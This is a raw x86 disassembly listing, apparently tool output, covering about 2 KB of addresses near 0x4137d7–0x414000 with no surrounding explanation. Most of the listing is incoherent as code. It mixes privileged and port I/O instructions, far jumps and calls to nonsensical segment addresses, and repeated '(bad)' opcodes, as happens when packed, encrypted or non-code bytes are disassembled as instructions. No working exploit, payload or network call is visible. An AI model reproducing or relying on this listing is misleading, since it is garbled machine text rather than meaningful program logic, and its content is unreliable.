  4137d7:	icebp  
  4137d8:	xchg   BYTE PTR [eax+0x4f],bl
  4137db:	cmp    DWORD PTR [eax+0xc],ebp
  4137de:	push   esp
  4137df:	cmp    BYTE PTR [ebx-0x30],bl
  4137e2:	sub    ch,bl
  4137e4:	dec    edi
  4137e5:	dec    ebx
  4137e6:	mov    cl,0xf6
  4137e8:	pop    es
  4137e9:	mov    BYTE PTR [ecx-0x51c7714b],bl
  4137ef:	pop    edx
  4137f0:	je     0x4137d6
  4137f2:	mov    al,ds:0xe1e816ed
  4137f7:	jge    0x4137ad
  4137f9:	shl    DWORD PTR [edi+0x1db64b64],1
  4137ff:	aam    0x35
  413801:	lods   al,BYTE PTR ds:[esi]
  413802:	scas   al,BYTE PTR es:[edi]
  413803:	out    dx,al
  413804:	fstp   st(0)
  413806:	mov    ebp,0x51d87f13
  41380b:	sub    al,0x9
  41380d:	inc    edi
  41380e:	inc    edi
  41380f:	xchg   ebp,eax
  413810:	inc    ebp
  413811:	dec    ebx
  413812:	scas   al,BYTE PTR es:[edi]
  413813:	in     al,dx
  413814:	das    
  413815:	mov    eax,0x6134145b
  41381a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41381b:	and    BYTE PTR [edi-0x66],0x98
  41381f:	pop    edi
  413820:	loop   0x4137cc
  413822:	sbb    al,0xb2
  413824:	sbb    eax,0x81f2788d
  413829:	push   edi
  41382a:	out    dx,eax
  41382b:	jg     0x413882
  41382d:	neg    DWORD PTR [edi]
  41382f:	call   0x6f3eea83
  413834:	fmul   DWORD PTR [edx+0x29]
  413837:	mov    fs,WORD PTR [ebx]
  413839:	adc    eax,0xcc962d41
  41383e:	test   BYTE PTR [edi-0x2b67278a],0x16
  413845:	sub    ebp,ebp
  413847:	(bad)
  41384a:	xchg   DWORD PTR ds:0xa4b64ce9,edi
  413850:	call   0x4b28:0x77c3f852
  413857:	mov    ah,0x9
  413859:	dec    ebp
  41385a:	in     eax,dx
  41385b:	repz mov al,0xd4
  41385e:	jmp    0xb404cb39
  413863:	xor    al,0x57
  413865:	loope  0x41387d
  413867:	mov    ebp,0x63adace6
  41386c:	sti    
  41386d:	popf   
  41386e:	aaa    
  41386f:	lods   al,BYTE PTR ds:[esi]
  413870:	inc    ebx
  413871:	adc    al,0x72
  413873:	adc    eax,0x44be1deb
  413878:	cmp    ebx,edx
  41387a:	ins    BYTE PTR es:[edi],dx
  41387b:	cmp    edi,DWORD PTR [edi-0x2e9752a7]
  413881:	pop    esp
  413882:	lds    esi,FWORD PTR [edi-0x57]
  413885:	pop    ebp
  413886:	xchg   ebp,eax
  413887:	in     al,dx
  413888:	retf   
  413889:	out    0xa0,eax
  41388b:	mov    ds:0x55958f02,al
  413890:	inc    ebx
  413891:	sub    ecx,DWORD PTR [esi+0x1c0cadf3]
  413897:	adc    dh,BYTE PTR [eax-0x52]
  41389a:	push   ecx
  41389b:	push   0xffffffe4
  41389d:	test   BYTE PTR [ebx-0xf],cl
  4138a0:	pop    ds
  4138a1:	jmp    0x78f9a9d
  4138a6:	and    esp,DWORD PTR [edi-0x2ad3ad4e]
  4138ac:	fwait
  4138ad:	repnz pop esi
  4138af:	data16 add cl,BYTE PTR [ebp-0xddc734f]
  4138b6:	ret    
  4138b7:	jge    0x41390e
  4138b9:	jmp    0x56a4d525
  4138be:	out    dx,al
  4138bf:	into   
  4138c0:	fsubp  st(1),st
  4138c2:	pop    edi
  4138c3:	jno    0x4138ec
  4138c5:	hlt    
  4138c6:	xor    DWORD PTR [esi-0xc65af9b],0x48
  4138cd:	jns    0x413948
  4138cf:	les    edx,FWORD PTR [edi+0x37]
  4138d2:	mov    ebx,0xb8bcffc4
  4138d7:	ins    BYTE PTR es:[edi],dx
  4138d8:	jne    0x413897
  4138da:	stos   BYTE PTR es:[edi],al
  4138db:	jmp    0x891e:0xd04a0101
  4138e2:	fyl2xp1 
  4138e4:	sub    bl,cl
  4138e6:	pop    es
  4138e7:	jbe    0x413936
  4138e9:	popf   
  4138ea:	sti    
  4138eb:	out    0xfd,eax
  4138ed:	fidivr DWORD PTR [ebx+0x6fb14c3d]
  4138f3:	cli    
  4138f4:	sub    edi,DWORD PTR [ecx+0x55]
  4138f7:	in     al,dx
  4138f8:	fcompp 
  4138fa:	popf   
  4138fb:	neg    DWORD PTR [edx]
  4138fd:	xchg   DWORD PTR [ebx-0x18d9eb38],esp
  413903:	add    DWORD PTR [ecx-0x5e],edi
  413906:	mov    eax,ebp
  413908:	mov    ah,BYTE PTR [edi+0x48bf803c]
  41390e:	jmp    0xbc7e16f6
  413913:	xor    al,0xe8
  413915:	inc    esp
  413916:	mov    ch,0x69
  413918:	or     al,0xa0
  41391a:	fwait
  41391b:	cli    
  41391c:	push   ebp
  41391d:	sbb    al,0x32
  41391f:	inc    esp
  413920:	repnz rcr BYTE PTR [di],cl
  413924:	add    DWORD PTR [ecx],esi
  413926:	add    edx,DWORD PTR ds:0x6e2a151a
  41392c:	inc    esi
  41392d:	mov    al,ds:0x874fe4eb
  413932:	jns    0x413964
  413934:	mov    WORD PTR [esi-0x4b012a3f],gs
  41393a:	mov    ch,0xa4
  41393c:	sahf   
  41393d:	ret    0x4660
  413940:	gs enter 0xecda,0x50
  413945:	push   es
  413946:	sahf   
  413947:	stos   BYTE PTR es:[edi],al
  413948:	and    DWORD PTR [ecx-0x723f7113],ecx
  41394e:	sub    DWORD PTR [ebx],edi
  413950:	jg     0x41397a
  413952:	push   0x53
  413954:	(bad)  
  413955:	mov    ds:0x4124ccd2,al
  41395a:	jns    0x41397b
  41395c:	lods   al,BYTE PTR ds:[esi]
  41395d:	push   esi
  41395e:	(bad)  
  41395f:	fbld   TBYTE PTR ds:0x71ce04cc
  413966:	lods   al,BYTE PTR ds:[esi]
  413967:	xchg   ebx,eax
  413968:	add    esp,DWORD PTR [ebp-0x43]
  41396b:	mov    ah,0xe0
  41396d:	lods   eax,DWORD PTR ds:[esi]
  41396e:	or     eax,0x67e51de5
  413973:	jno    0x4139ce
  413975:	sbb    esp,DWORD PTR [ebp+0x4b141f7d]
  41397b:	jmp    FWORD PTR [edi+0x4bbbba1]
  413981:	sbb    DWORD PTR [edx+edx*8+0x26],edx
  413985:	add    al,0x18
  413987:	xchg   BYTE PTR [edx-0x29],bh
  41398a:	mov    eax,0x9b41d044
  41398f:	dec    ecx
  413990:	gs pop edx
  413992:	fucomp st(7)
  413994:	sbb    eax,0x2167eaa0
  413999:	jmp    0x7ca40d78
  41399e:	lds    ebp,FWORD PTR [ebp-0x68]
  4139a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139a2:	mov    ebx,0x6eb278ae
  4139a7:	dec    ebx
  4139a8:	and    BYTE PTR [ecx+eiz*8],ah
  4139ab:	jl     0x41398c
  4139ad:	ret    
  4139ae:	mov    ebp,0xabaad014
  4139b3:	inc    ecx
  4139b4:	push   esi
  4139b5:	cdq    
  4139b6:	dec    ecx
  4139b7:	pop    edx
  4139b8:	adc    dl,BYTE PTR [eax]
  4139ba:	jecxz  0x4139cd
  4139bc:	pop    edx
  4139bd:	inc    ebx
  4139be:	cmp    al,0xe6
  4139c0:	push   ss
  4139c1:	imul   edx,DWORD PTR [esi-0xe307e54],0xebca4242
  4139cb:	imul   ecx,DWORD PTR [ebx-0x6f],0xfffffffc
  4139cf:	rcr    BYTE PTR [esi-0x2b0300fc],0x29
  4139d6:	add    BYTE PTR [ebx-0xd],bl
  4139d9:	pop    ss
  4139da:	mov    ah,0x3
  4139dc:	and    DWORD PTR [edx-0x62fde629],esi
  4139e2:	sbb    ebx,DWORD PTR [esi+0x13fa0233]
  4139e8:	mov    ch,0x11
  4139ea:	push   esp
  4139eb:	fcom   st(0)
  4139ed:	(bad)  
  4139ee:	mov    cl,0x34
  4139f0:	sub    bl,0x2a
  4139f3:	mov    WORD PTR [esi],?
  4139f5:	scas   eax,DWORD PTR es:[edi]
  4139f6:	pop    ss
  4139f7:	sbb    eax,0x4cd46427
  4139fc:	fiadd  WORD PTR [ebp+esi*1-0x4f655b1c]
  413a03:	sbb    DWORD PTR fs:[ecx+0x4ebcc9e],edx
  413a0a:	cs mov ah,0x3d
  413a0d:	cmp    eax,0x9b5574b9
  413a12:	dec    esp
  413a13:	push   ds
  413a14:	cmp    ah,BYTE PTR [esi+0x1c9784b7]
  413a1a:	mov    ch,0x7d
  413a1c:	out    0xbd,al
  413a1e:	push   eax
  413a1f:	sbb    al,0x7f
  413a21:	push   edi
  413a22:	mov    esi,0xbbecc038
  413a27:	iret   
  413a28:	mov    esp,0x2265069f
  413a2d:	push   ebp
  413a2e:	cmc    
  413a2f:	push   ebp
  413a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a31:	call   0x7e8:0x4a803ab
  413a38:	sub    DWORD PTR [ebp+0x6086b8dc],ebp
  413a3e:	mov    ecx,0x91367944
  413a43:	sahf   
  413a44:	pop    ebp
  413a45:	mov    ds,WORD PTR [ebp-0x70]
  413a48:	or     DWORD PTR [edi+0x62b2e5bf],esp
  413a4e:	in     eax,dx
  413a4f:	scas   al,BYTE PTR es:[edi]
  413a50:	cs or  eax,esi
  413a53:	out    0x48,eax
  413a55:	jmp    FWORD PTR [di]
  413a58:	sbb    bl,BYTE PTR [edi-0x54f9cbd9]
  413a5e:	lds    eax,FWORD PTR [ecx+0x33]
  413a61:	cdq    
  413a62:	jmp    0x413a22
  413a64:	push   ebp
  413a65:	(bad)  
  413a66:	mov    ebx,0x6639169c
  413a6b:	call   0x9a5b:0x44597e9f
  413a72:	sub    edi,DWORD PTR [eax-0x57a74bba]
  413a78:	daa    
  413a79:	popf   
  413a7a:	and    al,0xc9
  413a7c:	jbe    0x413a7f
  413a7e:	mov    dl,0xc4
  413a80:	(bad)  
  413a82:	mov    al,ds:0x9affc574
  413a87:	jmp    0xf8b68d1c
  413a8c:	pop    ds
  413a8d:	sub    DWORD PTR [edx],edi
  413a8f:	inc    esp
  413a90:	pop    esp
  413a91:	ror    DWORD PTR [ecx+ebx*1-0x3d34590f],1
  413a98:	test   BYTE PTR [ebx],0x58
  413a9b:	and    eax,DWORD PTR [esi+0x748ce444]
  413aa1:	pop    ebx
  413aa2:	mov    ch,0x44
  413aa4:	xchg   ebx,eax
  413aa5:	out    0xff,eax
  413aa7:	addr16 gs add eax,0x8f5fe51b
  413aae:	jmp    0x413a6b
  413ab0:	push   esp
  413ab1:	mov    ecx,0x21deb98
  413ab6:	stc    
  413ab7:	rcl    BYTE PTR [eax-0xa1a0bfc],0xad
  413abe:	cdq    
  413abf:	in     eax,0xdf
  413ac1:	aas    
  413ac2:	js     0x413af9
  413ac4:	and    bl,BYTE PTR [ecx+0x47]
  413ac7:	jns    0x413a7c
  413ac9:	test   eax,0xa4a3e47c
  413ace:	mov    ebx,0x8c95981
  413ad3:	jmp    DWORD PTR [edx*4-0x5caa0534]
  413ada:	mov    ebp,0x37c03424
  413adf:	mov    ds:0xeb9e7d75,al
  413ae4:	and    BYTE PTR [ecx+0x7ae53559],dl
  413aea:	inc    eax
  413aeb:	pop    esi
  413aec:	and    DWORD PTR [ebp-0x56],edi
  413aef:	pop    es
  413af0:	or     eax,0x48d8ff6f
  413af5:	das    
  413af6:	cdq    
  413af7:	rcr    DWORD PTR [ecx],1
  413af9:	test   eax,0x34089703
  413afe:	adc    bh,BYTE PTR [ebp-0x2f4826e7]
  413b04:	xchg   BYTE PTR [ecx],bl
  413b06:	xor    ecx,DWORD PTR [edi+0x1b2ba107]
  413b0c:	push   ebp
  413b0d:	xor    bh,BYTE PTR [eax-0x4e5e5a9f]
  413b13:	or     eax,0x54bd842a
  413b18:	jbe    0x413aee
  413b1a:	aaa    
  413b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b1c:	cmp    DWORD PTR [esi],eax
  413b1e:	push   eax
  413b1f:	xchg   esi,eax
  413b20:	adc    al,0x26
  413b22:	and    DWORD PTR [ebp-0x1e],ecx
  413b25:	mov    al,BYTE PTR ds:0xad923ea
  413b2b:	jns    0x413b03
  413b2d:	add    al,0x24
  413b2f:	scas   al,BYTE PTR es:[edi]
  413b30:	mov    esi,0x84cdac84
  413b35:	mov    al,ds:0x807467f7
  413b3a:	mov    dl,0xd0
  413b3c:	sbb    ebp,DWORD PTR [ecx]
  413b3e:	ror    DWORD PTR [ebx],1
  413b40:	pop    ebp
  413b41:	adc    eax,0xa1b4d1c6
  413b46:	stos   DWORD PTR es:[edi],eax
  413b47:	loopne 0x413b65
  413b49:	sbb    ch,ch
  413b4b:	inc    esp
  413b4c:	mov    al,ds:0x7111f704
  413b51:	mov    eax,0x7518e50c
  413b56:	int    0xfc
  413b58:	cmp    ecx,esp
  413b5a:	retf   
  413b5b:	mov    eax,0x745759fa
  413b60:	mov    al,ds:0x182b21c2
  413b65:	mov    DWORD PTR ds:0xb033196b,edx
  413b6b:	pop    esp
  413b6c:	fsub   DWORD PTR [edi-0x2a7bd85]
  413b72:	xchg   DWORD PTR [edx+0x34],edx
  413b75:	sahf   
  413b76:	addr16 ds jl 0x413ba0
  413b7a:	mov    ecx,0xb6265f94
  413b7f:	adc    ebp,DWORD PTR [ebp+0x4b1b1ba5]
  413b85:	int    0xbb
  413b87:	adc    ebp,esi
  413b89:	imul   esi,DWORD PTR [ecx],0xb7aaa769
  413b8f:	les    ebp,FWORD PTR [ebp+0x7b]
  413b92:	adc    al,0x3c
  413b94:	ja     0x413c0b
  413b96:	test   DWORD PTR [ecx],0xe8e8e545
  413b9c:	push   ebx
  413b9d:	rol    DWORD PTR ds:0xb20423a5,1
  413ba3:	inc    esp
  413ba4:	dec    edi
  413ba5:	fistp  WORD PTR [edx-0x79]
  413ba8:	data16 jge 0x413b32
  413bab:	and    edx,esi
  413bad:	mov    edx,DWORD PTR [edx-0x76]
  413bb0:	lahf   
  413bb1:	(bad)  
  413bb2:	mov    edi,0x67ecbe03
  413bb7:	mov    esp,0xf06932ed
  413bbc:	fsubr  DWORD PTR [edi]
  413bbe:	cmp    ecx,DWORD PTR [eax]
  413bc0:	vpandn ymm5,ymm3,ymm1
  413bc4:	adc    BYTE PTR [ecx+eiz*8+0x14],bh
  413bc8:	and    DWORD PTR [eax+0xf],esi
  413bcb:	mov    DWORD PTR [edi+0x21a4b6dd],ebx
  413bd1:	push   es
  413bd2:	loope  0x413bd9
  413bd4:	inc    ebp
  413bd5:	mov    eax,0x965dea09
  413bda:	shl    BYTE PTR [edx-0x142416b2],1
  413be0:	mov    esp,0xf535f68b
  413be5:	stos   BYTE PTR es:[edi],al
  413be6:	cmp    eax,0xdd1279ec
  413beb:	jge    0x413bff
  413bed:	fimul  DWORD PTR [ebx-0x69]
  413bf0:	push   esi
  413bf1:	ins    DWORD PTR es:[edi],dx
  413bf2:	out    0x1a,eax
  413bf4:	push   ss
  413bf5:	jmp    0x27a7c66c
  413bfa:	out    dx,eax
  413bfb:	std    
  413bfc:	jne    0x413bfb
  413bfe:	inc    edx
  413bff:	stc    
  413c00:	lock dec ebp
  413c02:	cmp    dl,dl
  413c04:	adc    eax,0xac26fb16
  413c09:	and    al,0xec
  413c0b:	lds    edi,FWORD PTR [eax-0x6ab4647]
  413c11:	mov    dh,0x7a
  413c13:	nop
  413c14:	and    al,0x2b
  413c16:	adc    ecx,0xf15d4f35
  413c1c:	inc    edi
  413c1d:	cmp    ebp,esi
  413c1f:	mov    ebp,0xfc91d920
  413c24:	pusha  
  413c25:	push   ds
  413c26:	inc    eax
  413c27:	jae    0x413bbd
  413c29:	cli    
  413c2a:	sub    al,0x92
  413c2c:	stos   DWORD PTR es:[edi],eax
  413c2d:	mov    bl,BYTE PTR [edx+ebx*1+0x1f]
  413c31:	ret    
  413c32:	ss mov esi,0x86f69489
  413c38:	sbb    eax,DWORD PTR [ecx+ebp*1+0x65]
  413c3c:	sbb    eax,0x6e612994
  413c41:	adc    eax,0x54a671ec
  413c46:	push   cs
  413c47:	dec    edx
  413c48:	jo     0x413be7
  413c4a:	push   edi
  413c4b:	aas    
  413c4c:	fisubr DWORD PTR [ebx-0x38]
  413c4f:	fwait
  413c50:	fwait
  413c51:	pop    esi
  413c52:	mov    bh,0x24
  413c54:	mov    bl,0x9a
  413c56:	je     0x413bfb
  413c58:	mov    bh,0x1f
  413c5a:	out    dx,al
  413c5b:	mov    ah,0xd6
  413c5d:	aad    0x60
  413c5f:	cmp    BYTE PTR [ecx],ah
  413c61:	jmp    0xefef:0x594cf115
  413c68:	push   edi
  413c69:	cli    
  413c6a:	ror    esi,cl
  413c6c:	xchg   esi,eax
  413c6d:	and    bh,ah
  413c6f:	add    esi,edi
  413c71:	lea    ecx,[ebp+0x6252e1]
  413c77:	addr16 pop edx
  413c79:	imul   edi,DWORD PTR [ecx-0x1ebf3cc],0x71
  413c80:	dec    esi
  413c81:	pushf  
  413c82:	imul   ebp,eax,0xfffffff0
  413c85:	xor    eax,0x8b298eb4
  413c8a:	adc    eax,ebp
  413c8c:	cwde   
  413c8d:	or     al,0xac
  413c8f:	enter  0xede4,0x4c
  413c93:	push   0xffffffa9
  413c95:	push   esp
  413c96:	mov    edx,0xd330e5ce
  413c9b:	jmp    0x3924:0x61d342d4
  413ca2:	iret   
  413ca3:	out    dx,al
  413ca4:	stc    
  413ca5:	mov    dh,0x6a
  413ca7:	lods   al,BYTE PTR ds:[esi]
  413ca8:	adc    al,0xa9
  413caa:	or     ecx,DWORD PTR [ebp-0x5b2c5f76]
  413cb0:	loop   0x413c66
  413cb2:	rcl    dl,1
  413cb4:	xlat   BYTE PTR ds:[ebx]
  413cb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cb6:	imul   ebx,DWORD PTR [eax-0x4966657a],0x1b
  413cbd:	sahf   
  413cbe:	imul   ebx,DWORD PTR [ebx+0x73],0x44
  413cc2:	mov    cl,0x8
  413cc4:	cmp    ah,al
  413cc6:	jo     0x413ce2
  413cc8:	xchg   edx,eax
  413cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cca:	mov    edx,0x10b5fb64
  413ccf:	mov    ds:0xe6edc475,al
  413cd4:	dec    esi
  413cd5:	outs   dx,DWORD PTR ds:[esi]
  413cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cd7:	pop    esi
  413cd8:	sbb    DWORD PTR [ecx+0x76],edi
  413cdb:	hlt    
  413cdc:	addr16 pop edx
  413cde:	cld    
  413cdf:	clc    
  413ce0:	mov    WORD PTR [ebx],ss
  413ce2:	jl     0x413d10
  413ce4:	inc    ebp
  413ce5:	adc    eax,DWORD PTR [edi+0x40]
  413ce8:	call   FWORD PTR [edx+0x1925f16c]
  413cee:	mov    al,ds:0x62b50881
  413cf3:	(bad)  
  413cf4:	aad    0x44
  413cf6:	cmp    esp,DWORD PTR [ebx-0x19]
  413cf9:	dec    edi
  413cfa:	mov    eax,0xc35249d3
  413cff:	call   0xd22046c5
  413d04:	retf   
  413d05:	into   
  413d06:	mov    ebx,0x543b5754
  413d0b:	daa    
  413d0c:	popf   
  413d0d:	and    eax,0x35e5d727
  413d12:	sub    esi,ecx
  413d14:	xchg   edx,eax
  413d15:	mov    al,ds:0x591daac6
  413d1a:	les    edi,FWORD PTR [esi]
  413d1c:	cmp    BYTE PTR [ebx],0xc5
  413d1f:	inc    ecx
  413d20:	jl     0x413cc1
  413d22:	neg    dl
  413d24:	(bad)  
  413d25:	data16 jno 0x413d8c
  413d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d29:	mov    ds:0x86b012e5,eax
  413d2e:	adc    al,0x9a
  413d30:	or     ch,BYTE PTR [edi]
  413d32:	mov    ebx,0xb2c08384
  413d37:	push   es
  413d38:	aad    0x7f
  413d3a:	jo     0x413d2d
  413d3c:	mov    bh,0xc8
  413d3e:	addr16 ss sbb eax,0x97ef4329
  413d45:	mov    cl,0x5e
  413d47:	fbstp  TBYTE PTR [eax]
  413d49:	sahf   
  413d4a:	fild   DWORD PTR [ecx+ecx*8+0x1f]
  413d4e:	mov    eax,0xbfdb50b8
  413d53:	push   ebp
  413d54:	sub    BYTE PTR [ebp-0x4f],ah
  413d57:	fs sbb eax,0x153c476b
  413d5d:	jbe    0x413d43
  413d5f:	out    dx,eax
  413d60:	dec    esi
  413d61:	sub    BYTE PTR [ebp-0x61],dl
  413d64:	mov    cl,BYTE PTR [ecx+0x5e]
  413d67:	or     DWORD PTR [edx+0x1d],edx
  413d6a:	js     0x413db3
  413d6c:	call   0xc5b:0x6dd2be30
  413d73:	sbb    BYTE PTR [edi-0x1c],ah
  413d76:	lds    esp,FWORD PTR [edx+0x5576fa62]
  413d7c:	inc    ecx
  413d7d:	mov    ds:0x2c94de0b,eax
  413d82:	data16 jns 0x413da7
  413d85:	pushf  
  413d86:	or     esi,DWORD PTR [esp+eax*2-0xcd9f2ac]
  413d8d:	cwde   
  413d8e:	jns    0x413d5b
  413d90:	add    DWORD PTR [ecx-0x7e],esi
  413d93:	out    0x9e,al
  413d95:	add    ch,0xcc
  413d98:	sub    eax,0xdef5212f
  413d9d:	inc    eax
  413d9e:	mov    al,0x8c
  413da0:	movaps xmm7,xmm3
  413da3:	or     DWORD PTR [ebx+0x4bb4bd37],0x68
  413daa:	or     ch,al
  413dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dad:	mov    ch,0x3d
  413daf:	out    0x6,al
  413db1:	inc    edx
  413db2:	loope  0x413dde
  413db4:	pop    ss
  413db5:	imul   edx,DWORD PTR [edx+0x6800760c],0x1a1d1d68
  413dbf:	and    ch,ah
  413dc1:	push   edx
  413dc2:	or     dh,ah
  413dc4:	cmp    DWORD PTR [ebp+0x3916e41a],edx
  413dca:	xchg   edi,eax
  413dcb:	inc    eax
  413dcc:	jmp    0x7f4f:0xd9b86047
  413dd3:	adc    BYTE PTR ds:0x38a49371,bl
  413dd9:	js     0x413e16
  413ddb:	sub    DWORD PTR [edi],0x2fafd429
  413de1:	push   esi
  413de2:	mov    dh,0x86
  413de4:	sbb    BYTE PTR [edi-0x13],bl
  413de7:	or     dh,BYTE PTR [ebp+0x1df9dc66]
  413ded:	xor    eax,0xc2334442
  413df2:	add    DWORD PTR [ecx+0x58],esi
  413df5:	pop    es
  413df6:	mov    ch,0x14
  413df8:	mov    eax,ds:0x5815716
  413dfd:	mov    ds:0x4959e8da,al
  413e02:	inc    esp
  413e03:	jmp    0x5407:0x68c18929
  413e0a:	out    0x3b,eax
  413e0c:	loop   0x413e73
  413e0e:	push   ebx
  413e0f:	dec    ebp
  413e10:	push   ebp
  413e11:	retf   
  413e12:	pusha  
  413e13:	in     eax,0x17
  413e15:	retf   
  413e16:	stc    
  413e17:	xor    BYTE PTR ds:0x36181d59,ah
  413e1d:	push   ss
  413e1e:	or     al,0x4c
  413e20:	jnp    0x413dc8
  413e22:	dec    ebx
  413e23:	lahf   
  413e24:	cmovbe edi,ebp
  413e27:	aas    
  413e28:	call   FWORD PTR [ecx]
  413e2a:	pusha  
  413e2b:	icebp  
  413e2c:	inc    ecx
  413e2d:	test   al,0xbc
  413e2f:	je     0x413df8
  413e31:	mov    ds:0x12c52154,eax
  413e36:	jb     0x413e28
  413e38:	cs enter 0xd8f6,0x4c
  413e3d:	pop    ecx
  413e3e:	int3   
  413e3f:	sbb    al,0xc1
  413e41:	lahf   
  413e42:	inc    edx
  413e43:	(bad)  
  413e45:	xor    DWORD PTR [ecx+0x69],edi
  413e48:	xchg   ebp,eax
  413e49:	lock add al,0xf4
  413e4c:	stc    
  413e4d:	mov    ecx,0xf92ecd2c
  413e52:	ja     0x413e14
  413e54:	fldenv [ecx-0x30]
  413e57:	inc    edi
  413e58:	pop    ds
  413e59:	adc    eax,0xb125576b
  413e5e:	aaa    
  413e5f:	hlt    
  413e60:	inc    ecx
  413e61:	pop    edi
  413e62:	dec    eax
  413e63:	ja     0x413e83
  413e65:	pop    ecx
  413e66:	out    dx,al
  413e67:	push   ds
  413e68:	jmp    0xdbaa:0x93825cfc
  413e6f:	xor    BYTE PTR [ebx+0x67560d47],0xa1
  413e76:	ins    DWORD PTR es:[edi],dx
  413e77:	add    bl,BYTE PTR [eax]
  413e79:	mov    DWORD PTR [edi+eiz*8-0x5ab6be5e],ecx
  413e80:	popa   
  413e81:	xchg   ecx,eax
  413e82:	dec    esp
  413e83:	push   eax
  413e84:	mov    ecx,0x4f6502cb
  413e89:	gs mov ebx,0x1e08a4b0
  413e8f:	or     al,0x5d
  413e91:	std    
  413e92:	mov    ah,0xc4
  413e94:	fwait
  413e95:	aam    0x48
  413e97:	or     BYTE PTR ds:0x76ebc420,dl
  413e9d:	outs   dx,BYTE PTR ds:[esi]
  413e9e:	cs aas 
  413ea0:	sbb    bh,cl
  413ea2:	push   es
  413ea3:	jns    0x413ee0
  413ea5:	xor    ch,0xfe
  413ea8:	fs lahf 
  413eaa:	push   0x25
  413eac:	test   al,0x65
  413eae:	or     eax,0x5c0e86b1
  413eb3:	retf   
  413eb4:	sbb    DWORD PTR [ecx],esp
  413eb6:	xchg   dl,al
  413eb8:	push   ds
  413eb9:	fdiv   QWORD PTR [ebp+0x54]
  413ebc:	and    BYTE PTR [ecx],bh
  413ebe:	mov    edx,0x3270efe6
  413ec3:	jno    0x413e6f
  413ec5:	aas    
  413ec6:	jae    0x413e81
  413ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ec9:	repnz sub esi,esp
  413ecc:	cs push ss
  413ece:	jbe    0x413f3b
  413ed0:	adc    eax,0x47
  413ed3:	or     DWORD PTR [edi],0x47
  413ed6:	ret    0x5364
  413ed9:	cmp    al,0x7c
  413edb:	and    BYTE PTR [edi+0x6302fc4b],dl
  413ee1:	test   al,0x8a
  413ee3:	pop    esp
  413ee4:	xchg   edi,eax
  413ee5:	inc    ebx
  413ee6:	lds    ebx,FWORD PTR [eax+ebp*2]
  413ee9:	pop    ecx
  413eea:	sbb    eax,0x143a0eed
  413eef:	les    esp,FWORD PTR [ebx]
  413ef1:	mov    al,ds:0x23c1439b
  413ef6:	fcomi  st,st(7)
  413ef8:	push   0x86c6957f
  413efd:	jl     0x413f6a
  413eff:	mov    BYTE PTR [ebp-0xd0ed531],al
  413f05:	sub    edi,0xffffffb7
  413f08:	mov    WORD PTR ds:0xec1ae4b9,fs
  413f0e:	scas   al,BYTE PTR es:[edi]
  413f0f:	mov    edi,0xb04476aa
  413f14:	mov    dh,0xcb
  413f16:	mov    esi,0x73c2e0f4
  413f1b:	jp     0x413f3e
  413f1d:	imul   edi,edx,0x267cd233
  413f23:	cli    
  413f24:	retf   0xcba0
  413f27:	or     BYTE PTR [ebx],0x32
  413f2a:	push   ss
  413f2b:	fwait
  413f2c:	push   edi
  413f2d:	dec    eax
  413f2f:	and    bl,BYTE PTR [edi-0x43]
  413f32:	mov    ch,0x54
  413f34:	mov    eax,0xd7c966ee
  413f39:	mov    bl,0xca
  413f3b:	dec    eax
  413f3c:	cdq    
  413f3d:	call   0xbef4:0xe12af3ef
  413f44:	cmp    DWORD PTR [ecx-0x66],esp
  413f47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f48:	sbb    al,0xe9
  413f4a:	cs repnz test ax,0x7ed
  413f50:	in     al,0x4
  413f52:	and    esi,DWORD PTR [ecx-0x3b]
  413f55:	ja     0x413f6f
  413f57:	repz mov al,ds:0xa0b6f947
  413f5d:	into   
  413f5e:	jg     0x413f2b
  413f60:	adc    eax,0xd5f44edf
  413f65:	adc    eax,0x845d709d
  413f6a:	int3   
  413f6b:	ins    DWORD PTR es:[edi],dx
  413f6c:	js     0x413f93
  413f6e:	(bad)  
  413f6f:	pop    edi
  413f70:	leave  
  413f71:	jae    0x413f29
  413f73:	or     cl,BYTE PTR [edx+ebx*8]
  413f76:	inc    edx
  413f77:	ret    0x9a84
  413f7a:	jns    0x413f00
  413f7c:	pop    es
  413f7d:	rcr    DWORD PTR [esp+eax*1-0x11d45a60],cl
  413f84:	pop    ebx
  413f85:	fwait
  413f86:	dec    ecx
  413f87:	jns    0x413fb3
  413f89:	mov    bl,0x19
  413f8b:	inc    edi
  413f8c:	mov    cl,0x14
  413f8e:	mov    dl,0xa4
  413f90:	cmp    BYTE PTR [ecx+0x3a0592e2],dl
  413f96:	jb     0x413f7e
  413f98:	dec    esp
  413f99:	mov    BYTE PTR [esi+0x2c69fd37],0x92
  413fa0:	mov    eax,ds:0x56cc8399
  413fa5:	mov    ebp,0x2f9954cb
  413faa:	clc    
  413fab:	test   BYTE PTR [esi-0x79],bl
  413fae:	mov    bl,0x74
  413fb0:	xchg   ebp,eax
  413fb1:	aas    
  413fb2:	sti    
  413fb3:	lds    ebp,FWORD PTR [ebp+0x4d04ca68]
  413fb9:	in     al,dx
  413fba:	mov    ecx,0xbba5ec65
  413fbf:	xchg   BYTE PTR [eax*2+0x6d5968d5],al
  413fc6:	mov    ah,0x5e
  413fc8:	jno    0x413f9a
  413fca:	mov    cl,0xb4
  413fcc:	sub    bh,0x2b
  413fcf:	adc    eax,DWORD PTR [ebp-0x1b]
  413fd2:	add    ch,dh
  413fd4:	mov    ds:0x25c5f912,al
  413fd9:	cmp    DWORD PTR [edx],ebp
  413fdb:	ror    BYTE PTR [ecx],0x1f
  413fde:	push   ebx
  413fdf:	push   ecx
  413fe0:	(bad)  
  413fe1:	(bad)
  413fe6:	in     al,dx
  413fe7:	jmp    0xe9a8c111
  413fec:	outs   dx,BYTE PTR ds:[esi]
  413fed:	dec    edx
  413fee:	addr16 out 0x18,al
  413ff1:	jmp    0xea3e5458
  413ff6:	imul   ebx,DWORD PTR [esi+eax*4],0xffffff9c
  413ffa:	mov    ebx,0xdd01ac75
  413fff:	pop    ebp
  414000:	fwait
